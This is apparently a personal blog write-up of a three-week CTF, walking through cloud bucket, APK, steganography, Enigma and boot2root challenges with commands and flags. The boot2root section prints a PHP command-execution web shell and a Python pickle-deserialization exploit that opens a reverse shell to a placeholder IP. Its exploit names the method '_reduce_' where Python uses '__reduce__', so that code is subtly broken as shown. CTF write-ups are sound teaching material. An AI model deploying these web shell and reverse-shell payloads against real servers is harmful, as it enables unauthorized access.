This CTF was probably the longest one I‚Äôve been part of‚Äî21 days straight, with fresh challenges rolling out every Friday. Most of them were honestly pretty chill and easy to get through, but a few definitely grabbed my attention. I ended up in the Top 5, which was cool! Here‚Äôs my take on each challenge, along with write-ups on how I cracked them. Enjoy the breakdown!

## Cloud

### **Cloudy Records**

Description: 

A sensitive data leak has occurred at the fictional company "CloudCorps." As a security expert, your job is to find their exposed Cloud Storage bucket and retrieve the flag.

`https://hallofhacks.com/`

<img src="/assets/posts/HackHavocCTF/4.png" alt="p4" width="75%"/>

At first I was looking into s3 scanning tools. And found a cool one, since I had some experience with these type it was good to see it again.

[S3Scanner](https://github.com/sa7mon/S3Scanner)

with this tool, you can check whether a bucket exists or not in a CLI environment, we can also create a bucket-list and let the tool run through all of them. After a lot of trial and error, I tried a different approach, I thought of reading the TXT records of the target, and turns out I was right HAHA.

```bash
‚îî‚îÄ$ dig +short TXT hallofhacks.com
"Find the flag at https://storage.googleapis.com/cloudcorps-important/"
```

Finally, we can also verify with `s3scanner`.

```bash
‚îî‚îÄ$ s3scanner -provider gcp -bucket cloudcorps-important -enumerate -json
{
  "bucket": {
    "name": "cloudcorps-important",
    "region": "default",
    "exists": 1,
    "date_scanned": "2024-11-04T18:56:59.66832505+05:30",
    "objects": [
      {
        "key": "Hall_of_Hacks_1.pdf",
        "size": 13841976
      },
      {
        "key": "Hall_of_Hacks_2.pdf",
        "size": 18984
      },
      {
        "key": "Hall_of_Hacks_3.pdf",
        "size": 21034975
      }
    ],
    "objects_enumerated": true,
    "provider": "gcp",
    "num_objects": 3,
    "bucket_size": 34895935,
    "owner_id": "",
    "owner_display_name": "",
    "perm_auth_users_read": 2,
    "perm_auth_users_write": 2,
    "perm_auth_users_read_acl": 2,
    "perm_auth_users_write_acl": 2,
    "perm_auth_users_full_control": 2,
    "perm_all_users_read": 1,
    "perm_all_users_write": 2,
    "perm_all_users_read_acl": 0,
    "perm_all_users_write_acl": 2,
    "perm_all_users_full_control": 2
  },
  "level": "info",
  "msg": "",
  "time": "2024-11-04T18:57:01.520121216+05:30"
}
```

Then we find the flag at `Hall_of_Hacks_2.pdf` . Pretty neat challenge !

Flag: `CM{GCP_CloudStorage_Bucket_Challenge_20241018}`

## Forensics

### **QR-azy Mystery!**

**Description**: Can you turn this pixel mush into glory?

Given: `goneeeee.png`

In this challenge we are given a blurred QR. I loaded it into GIMP straight-away.

Flag: `CM{GOLDEN_GATE_BRIDGE}`

## Mobile

### **APK-ocalypse Now!**

**Description**: Put on your detective hat and dive into our mysterious APK! Get it and uncover hidden treasures‚Äîwill it be memes, cat videos, or just code? Get ready to crack the APK-ocalypse! üê±‚Äçüë§üí•

Given: `hackhavoc.apk`

Me see APK, Me use `APKTool`

```bash
‚îî‚îÄ$ apktool d hackhavoc.apk
I: Using Apktool 2.7.0-dirty on hackhavoc.apk
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
```

Now we dig in.

```bash
‚îå‚îÄ‚îÄ(abu„âøAbuntu)-[/mnt/c/Documents4/CyberSec/HackHavocCTF/Mobile/hackhavoc/unknown/app-release]
‚îî‚îÄ$ cat AndroidManifest.xml | grep {
<!-- XD: PZ{U1qq3a_7Y4t_1a_Z4aVS35G} -->
```

Now, we know that‚Äôs ROT-13, did you know there was a simpler way to solve this rather than loading this into online solvers.

```bash
‚îî‚îÄ$ rot13 flag
CM{H1dd3n_7L4g_1n_M4nIF35T}
```

Thank me later. HAHA.

Flag: `CM{H1dd3n_7L4g_1n_M4nIF35T}`

## Stego

### **Incidents in Disguise**

**Description**: Is this an image or a game of Hide and Seek? Between the incidents of May and June, secrets lurk in the pixels! Something reversing makes things easier. Lets Rock!!

Given: `file.jpg`

We all destroy `stegseek`at first, but then the hints drop in, hinting on the password containing `amos`.

```bash
‚îî‚îÄ$ cat ../../../Research/Resources/rockyou.txt | grep amos > wordlist.txt
```

then after a lot of trial and error and GPT scripts later.

```bash
‚îî‚îÄ$ steghide extract -sf file.jpg -p *7¬°Vamos!
wrote extracted data to "flag.txt".

‚îî‚îÄ$ cat flag.txt
CM{Bru73_f0rc3_i5_b35t}
```

Flag: `CM{Bru73_f0rc3_i5_b35t}`

### **p13ces**

**Description**: Once upon a time in the land of pixels, a sneaky group of flags decided to hide in the most unexpected places‚Äîinside ordinary images! ‚ò†Ô∏è Your quest, brave adventurer, is to embark on a pixelated treasure hunt. Help Lira uncover the hidden pieces, decode the message, and craft the legendary flag.

Flag Format : CM{}

Given: `https://sites.google.com/cybermaterial.com/lira-journey/`

Get all the images. `1.jfif - 2.jpg - 3.jpg`

Spam `steghide` on them. 

```bash
‚îî‚îÄ$ steghide extract -sf 1.jfif
Enter passphrase:
wrote extracted data to "part-1-flag.txt".
```

Lira walked through the quiet village at dusk, her thoughts wandering as she crossed the old bridge.
She noticed something strange about the stone railing‚Äîa small, engraved marking. She traced her finger over it and uncovered a hidden message: `{Break_`
A shiver ran down her spine as she continued into the woods.

```bash
‚îî‚îÄ$ steghide extract -sf 2.jfif
Enter passphrase: {Break_
wrote extracted data to "part-2-flag.txt".
```

Deep in the forest, Lira found a strange rock formation. Beneath one of the stones, another engraving appeared: "`1t`". The pieces were falling into place, but the meaning still escaped her.

```bash
‚îî‚îÄ$ steghide extract -sf 3.jfif
Enter passphrase: 1t
wrote extracted data to "part-3-flag.txt".
```

As Lira ventured further, she stumbled upon an abandoned cabin. Inside, hidden in the floorboards, was yet another piece of the puzzle:
Visit this site and get your part: `https://pastebin.com/V3nbr0sm`.

The mystery was growing, and the answers seemed just out of reach.

![8](../assets/posts/HackHavocCTF/8.png)

and finally the last part is the image itself LOL.

Flag: `CM{Break_1t_1int0_p13ces}`

## Open-Source Intelligence

### **More Like ‚ÄòEnig-me‚Äô**

**Description**: 

The Enigma Machine was a complex encryption device used by the German military during World War II. Its intricate design and multiple settings made it incredibly difficult to crack. In this challenge, you'll take on the role of a codebreaker and attempt to decipher a message encrypted using a modified Enigma Machine.

Encoded txt : `ugtyq djiwc ruejq ebdux hcrqr kiznu hokzy sngry zfxnv gbjki dqknr ma`

Decoded txt: CyberMaterial is the world number one cybersecurity data platform.

Your flag follows the format `CM{Rotor_x-x-x_Pos_x-x-x_Reflector_x_Plug_x-x_x-x_Ring_x-x-x}`. Good luck decoding the mystery!"

This challenge really tested the patience of all of competitors. Dived into theoretical enigma cipher and all that, and finally it was just the same old tool. God knows what happened to the original cipher we were given. After weeks of hints above hints. Finally cracked it.

## Boot2Root

### **Hacker's Fortress**

**Description**:

In this boot-to-root exercise, participants will need to leverage their skills in file uploading and privilege escalation to uncover a hidden flag. The challenge simulates a real-world scenario where unauthorized access to a server must be achieved to find sensitive information.

Author:¬†**`DarkUnic0rn`**

`http://35.208.110.64`

It‚Äôs a quite nice file-upload vulnerability.

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

Send it to the server and visit the `/uploads` to find out the upload we sent. After that just play around until flag hits.

### **Hashing Numbers**

**Description**: To access its secrets, you must first prove your worth by calculating a mathematical expression, a test of both intellect and skill. Will you rise to the challenge and secure the sensitive information, or will the secrets remain forever locked away? The choice is yours.

Flag structure: `CM{XXX-###_##}`

`https://sites.google.com/cybermaterial.com/hashing-numbers`

Listing the drop-down menu in the landing page, we look at another link.

Real good challenge. Dive.

Cookies. The cookies are serialized Python objects that store information about cart items.

`Deserialization` is the process of converting a serialized string back into an object. If a web application unpickles data received from a client without proper validation, an attacker can manipulate the serialized data to execute arbitrary code.
The challenge utilizes Python's `pickle` for serialization, which can be exploited if an application unsafely deserializes objects without validating their contents.

Inspect the web app and capture the Cookie under Applications.

```python
import base64
import pickle

cookie = "gASVigAAAAAAAABdlCh9lCiMAmlklEsHjARuYW1llIwGaXRlbSA3lIwFcHJpY2WUjAVScy4gN5R1fZQojAJpZJRLC4wEbmFtZZSMB2l0ZW0gMTGUjAVwcmljZZSMBlJzLiAxMZR1fZQojAJpZJRLCowEbmFtZZSMB2l0ZW0gMTCUjAVwcmljZZSMBlJzLiAxMJR1ZS4="
payload = base64.b64decode(cookie)

pickle = pickle.loads(payload)
print(pickle)
```

Run it.

```python
‚îî‚îÄ$ python3 solve.py
[
   {
      "id":7,
      "name":"item 7",
      "price":"Rs. 7"
   },
   {
      "id":11,
      "name":"item 11",
      "price":"Rs. 11"
   },
   {
      "id":10,
      "name":"item 10",
      "price":"Rs. 10"
   }
]
```

And we successfully deserialize the pickle cookie.

Tried to use `ngrok` to get the local IP out there. But Failed.

```python

But this was actually a false positive as it had issues with the bank.

Luckily I got a droplet in Digital Ocean from `H7CTF` .

Now we craft our exploit for RCE.

```python
import pickle, os, base64
import requests
from base64 import b64encode

class CommandExecution(object):
    def _reduce_(self):
        return (os.system, ("python3 -c 'import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"YOUR_IP\", 3000)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); subprocess.call([\"/bin/bash\", \"-i\"])'",))

def create_payload():
    item = [{'item_id': 'ls', 'item_name': CommandExecution(), 'item_price': 'Rs. 4'}]
    serialized_data = pickle.dumps(item)
    encoded_data = b64encode(serialized_data).decode()
    return encoded_data

def send_request(encoded_payload):
    target_url = 'http://35.208.230.20/view'
    cookies = {
        'cart': encoded_payload
    }
    response = requests.get(target_url, cookies=cookies)
    return response.text

def main():
    payload = create_payload()
    print(f'[*] Payload: {payload}')
    result = send_request(payload)
    print('[*] Request result:')
    print(result)

main()

```

Running the exploit, it pops a shell BOOM.

P.S. Call an ambulance, but not for me LOL.
